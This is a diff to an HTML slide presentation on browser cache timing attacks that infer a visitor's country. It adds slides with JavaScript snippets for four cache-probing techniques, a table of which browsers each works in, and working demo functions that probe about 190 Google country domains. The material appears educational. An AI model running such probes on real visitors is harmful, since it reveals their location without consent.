@@ -90,30 +90,138 @@
 					</ul>
 				</section>
 				<section>
-					<h2>Techniques Available to Query the Victim's Browser Cache</h2>
+					<h2>Querying the Victim's Browser Cache #1</h2>
 					<ul>
-						<li class="fragment"><pre><code>&lt;img src="some-location-specific-resource" /&gt;</code></pre></li>
+						<pre class="fragment"><code>&lt;img src="some-location-specific-resource" /&gt;</code></pre>
 						<ul>
 							<li class="fragment">Save the start time and end time and compute the difference after the resource loads</li>
 						</ul>
+						<pre class="fragment"><code>var image = document.createElement(‘img’);
+image.src = url;
+image.setAttribute(‘startTime’, (new Date().getTime()));
+image.onload = function()
+{
+	var endTime = new Date().getTime();
+	var loadTime = endTime - parseInt(this.
+	getAttribute(‘startTime’));
+}</code></pre>
 					</ul>
 				</section>
 				<section>
-					<h2>Techniques Available to Query the Victim's Browser Cache</h2>
+					<h2>Querying the Victim's Browser Cache #2</h2>
 					<ul>
 						<li class="fragment">Cross-Origin Resource Sharing (CORS)</li>
 						<ul>
-							<li class="fragment">Similar to above technique but using CORS</li>
+							<li class="fragment">Similar to the previous technique but make the request manually in JavaScript</li>
+							<li class="fragment">This DOES work in Chrome and Opera</li>
+							<li class="fragment">This does NOT work in Firefox, Safari, and IE</li>
+							<pre class="fragment"><code>var starTime, endTime, loadTime;
+var xmlhttp = new XMLHttpRequest();
+xmlhttp.onloadstart = function()
+{
+	startTime = (new Date()).getTime();
+}
+xmlhttp.onloadend = function()
+{
+	endTime = (new Date()).getTime();
+	loadTime = endTime - startTime;
+}
+</code></pre>
 						</ul>
 					</ul>
 				</section>
 				<section>
-					<h2>Techniques Available to Query the Victim's Browser Cache</h2>
+					<h2>Querying the Victim's Browser Cache #3</h2>
 					<ul>
-						<li class="fragment"><pre><code>&lt;img src="some-location-specific-resource" complete="complete"/&gt;</code></pre></li>
+						<pre class="fragment"><code>&lt;img src="some-location-specific-resource" complete="complete"/&gt;</code></pre>
 						<ul>
-							<li class="fragment">Check the <i>complete</i> attribute of the image tag immediately after setting it's src property</li>
+							<li class="fragment">Check the <i>complete</i> attribute of the image tag immediately after setting its <i>src</i> property</li>
+							<li class="fragment">This does NOT work in Chrome and Opera</li>
+							<li class="fragment">This DOES work in Firefox, Safari, and IE</li>
 						</ul>
+						<pre class="fragment"><code>function cached(url)
+{
+	var image = document.createElement(‘img’);
+	image.src = url;
+	return image.complete || image.width+image.height > 0;
+}</code></pre>
+					</ul>
+				</section>
+				<section>
+					<h2>Querying the Victim's Browser Cache #4</h2>
+					<ul>
+						<li>iframe</li>
+						<ul>
+							<li class="fragment">Similar to CORS, measure the start and end time then compute the difference</li>
+						</ul>
+						<pre class="fragment"><code>var page = document.createElement(‘iframe’);
+page.setAttribute(‘startTime’, (new Date()).getTime());
+page.onload = function ()
+{
+	var endTime = (new Date()).getTime();
+	var loadTime = ( endTime - parseInt(this.
+	getAttribute(‘startTime’)));
+}</code></pre>
+					</ul>
+				</section>
+				<section>
+					<h2>Geo-interence Attacks on Mainstream Browsers</h2>
+					<table>
+						<thead>
+							<tr>
+								<th>Browser</th>
+								<th>Image Load Time</th>
+								<th>CORS</th>
+								<th>&lt;img&gt; <i>complete</i></th>
+							</tr>
+						</thead>
+						<tbody>
+							<tr>
+								<td>Chrome</td>
+								<td>X</td>
+								<td>X</td>
+								<td>-</td>
+							</tr>
+							<tr>
+								<td>Firefox</td>
+								<td>X</td>
+								<td>-</td>
+								<td>X</td>
+							</tr>
+							<tr>
+								<td>Safari</td>
+								<td>X</td>
+								<td>-</td>
+								<td>X</td>
+							</tr>
+							<tr>
+								<td>Opera</td>
+								<td>X</td>
+								<td>X</td>
+								<td>-</td>
+							</tr>
+							<tr>
+								<td>IE</td>
+								<td>X</td>
+								<td>-</td>
+								<td>X</td>
+							</tr>
+						</tbody>
+					</table>
+				</section>
+				<section>
+					<h2>Locating a Victim's Country</h2>
+					<ul>
+						<li class="fragment">Google has 191 geography-specific domains</li>
+						<li class="fragment">Utilize Google's logo image</li>
+						<ul class="fragment">
+							<li><i>google.com.sg</i></li>
+							<li><i>/images/srpr/logo11w.png</i></li>
+						</ul>
+						<li class="fragment">Attempt to request the image and observe the load time</li>
+						<li class="fragment">Logo's Max Age in cache: 31536000ms ~ 8.76 hours</li>
+						<li class="fragment"><a href="#/10" onclick="locateCountryCompleteTag()">Click for demo (Firefox, Safari, IE)</a></li>
+						<li class="fragment"><a href="#/10" onclick="locateCountryLoadTime()">Click for demo (Chrome, Opera)</a></li>
 					</ul>
 				</section>
 			</div>
@@ -146,6 +254,31 @@
 				]
 			});
 
+			function locateCountryCompleteTag() {
+				for (var i = 0; i < GOOGLE_DOMAIN_LIST.length; ++i)
+				{
+					var img = document.createElement("img");
+					var url = GOOGLE_DOMAIN_LIST[i].replace("http://", "http://www.");
+					img.src = url + "images/branding/googlelogo/1x/googlelogo_color_272x92dp.png";
+					if (img.complete || img.width + img.height > 0) console.log(GOOGLE_DOMAIN_LIST[i]);
+				}
+			}
+			
+			function locateCountryLoadTime() {
+				for (var i = 0; i < GOOGLE_DOMAIN_LIST.length; ++i)
+				{
+					var img = document.createElement("img");
+					var url = GOOGLE_DOMAIN_LIST[i].replace("http://", "http://www.");
+					img.setAttribute("start", new Date().getTime());
+					img.src = url + "images/branding/googlelogo/1x/googlelogo_color_272x92dp.png";
+					img.onload = function(){
+						var end = new Date().getTime();
+						if (end - parseInt(this.getAttribute("start")) < 100) console.log(this.src);
+					};
+				}
+			}
+			
+			var GOOGLE_DOMAIN_LIST = JSON.parse('["http://google.com/","http://google.ac/","http://google.ad/","http://google.ae/","http://google.com.af/","http://google.com.ag/","http://google.com.ai/","http://google.al/","http://google.am/","http://google.co.ao/","http://google.com.ar/","http://google.as/","http://google.at/","http://google.com.au/","http://google.az/","http://google.ba/","http://google.com.bd/","http://google.be/","http://google.bf/","http://google.bg/","http://google.com.bh/","http://google.bi/","http://google.bj/","http://google.com.bn/","http://google.com.bo/","http://google.com.br/","http://google.bs/","http://google.bt/","http://google.co.bw/","http://google.by/","http://google.com.bz/","http://google.ca/","http://google.com.kh/","http://google.cc/","http://google.cd/","http://google.cf/","http://google.cat/","http://google.cg/","http://google.ch/","http://google.ci/","http://google.co.ck/","http://google.cl/","http://google.cm/","http://google.cn/","http://google.com.co/","http://google.co.cr/","http://google.com.cu/","http://google.cv/","http://google.com.cy/","http://google.cz/","http://google.de/","http://google.dj/","http://google.dk/","http://google.dm/","http://google.com.do/","http://google.dz/","http://google.com.ec/","http://google.ee/","http://google.com.eg/","http://google.es/","http://google.com.et/","http://google.fi/","http://google.com.fj/","http://google.fm/","http://google.fr/","http://google.ga/","http://google.ge/","http://google.gf/","http://google.gg/","http://google.com.gh/","http://google.com.gi/","http://google.gl/","http://google.gm/","http://google.gp/","http://google.gr/","http://google.com.gt/","http://google.gy/","http://google.com.hk/","http://google.hn/","http://google.hr/","http://google.ht/","http://google.hu/","http://google.co.id/","http://google.iq/","http://google.ie/","http://google.co.il/","http://google.im/","http://google.co.in/","http://google.io/","http://google.is/","http://google.it/","http://google.je/","http://google.com.jm/","http://google.jo/","http://google.co.jp/","http://google.co.ke/","http://google.ki/","http://google.kg/","http://google.co.kr/","http://google.com.kw/","http://google.kz/","http://google.la/","http://google.com.lb/","http://google.com.lc/","http://google.li/","http://google.lk/","http://google.co.ls/","http://google.lt/","http://google.lu/","http://google.lv/","http://google.com.ly/","http://google.co.ma/","http://google.md/","http://google.me/","http://google.mg/","http://google.mk/","http://google.ml/","http://google.com.mm/","http://google.mn/","http://google.ms/","http://google.com.mt/","http://google.mu/","http://google.mv/","http://google.mw/","http://google.com.mx/","http://google.com.my/","http://google.co.mz/","http://google.com.na/","http://google.ne/","http://google.com.nf/","http://google.com.ng/","http://google.com.ni/","http://google.nl/","http://google.no/","http://google.com.np/","http://google.nr/","http://google.nu/","http://google.co.nz/","http://google.com.om/","http://google.com.pk/","http://google.com.pa/","http://google.com.pe/","http://google.com.ph/","http://google.pl/","http://google.com.pg/","http://google.pn/","http://google.co.pn/","http://google.com.pr/","http://google.ps/","http://google.pt/","http://google.com.py/","http://google.com.qa/","http://google.ro/","http://google.rs/","http://google.ru/","http://google.rw/","http://google.com.sa/","http://google.com.sb/","http://google.sc/","http://google.se/","http://google.com.sg/","http://google.sh/","http://google.si/","http://google.sk/","http://google.com.sl/","http://google.sn/","http://google.sm/","http://google.so/","http://google.st/","http://google.sr/","http://google.com.sv/","http://google.td/","http://google.tg/","http://google.co.th/","http://google.com.tj/","http://google.tk/","http://google.tl/","http://google.tm/","http://google.to/","http://google.tn/","http://google.com.tr/","http://google.tt/","http://google.com.tw/","http://google.co.tz/","http://google.com.ua/","http://google.co.ug/","http://google.co.uk/","http://google.com/","http://google.com.uy/","http://google.co.uz/","http://google.com.vc/","http://google.co.ve/","http://google.vg/","http://google.co.vi/","http://google.com.vn/","http://google.vu/","http://google.ws/","http://google.co.za/","http://google.co.zm/","http://google.co.zw/"]');
 		</script>
 
 	</body>
